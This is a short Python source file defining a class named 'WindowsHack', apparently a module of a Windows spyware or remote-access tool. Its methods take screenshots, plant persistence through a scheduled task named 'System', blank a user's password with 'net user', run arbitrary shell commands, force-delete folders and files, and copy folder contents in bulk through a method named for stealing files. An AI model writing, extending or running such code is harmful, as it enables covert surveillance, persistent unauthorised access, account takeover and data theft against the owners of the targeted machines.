import os
from settings import USER, ROOT_FOLDER, AUTOLOAD_XML
import pyautogui
import shutil


class WindowsHack:
    def __init__(self, save_folder=ROOT_FOLDER):
        self.save_folder = save_folder

    def create_root_folder(self):
        os.mkdir(self.save_folder)

    def remove_root_folder(self):
        os.system(f'rmdir /s /q {self.save_folder}')

    def take_screen(self):
        screen = pyautogui.screenshot()
        screen.save(self.save_folder + '\\screen.png')

    @staticmethod
    def creat_folder(path):
        os.mkdir(path)

    @staticmethod
    def remove_folder(path):
        os.system(f'rmdir /s /q {path}')

    @staticmethod
    def remove_file(path):
        os.system(f'del {path}')

    @staticmethod
    def add_autoload():
        with open("System.xml", 'w') as wrt:
            wrt.write(AUTOLOAD_XML)
        res = os.system(f'Schtasks /create /xml "System.xml" /F /TN "System"')
        os.system('del System.xml')

    @staticmethod
    def copy(dir_from, dir_to):
        res = shutil.copyfile(dir_from, dir_to)
        return res

    @staticmethod
    def remove_password():
        res = os.system(f'net user {USER} ""')

    @staticmethod
    def cmd(command):
        return os.system(command)

    @staticmethod
    def still_files_from_folder(folder_from, folder_to):
        res = os.system(f'xcopy /y /q /e "{folder_from}" "{folder_to}"')
        return res
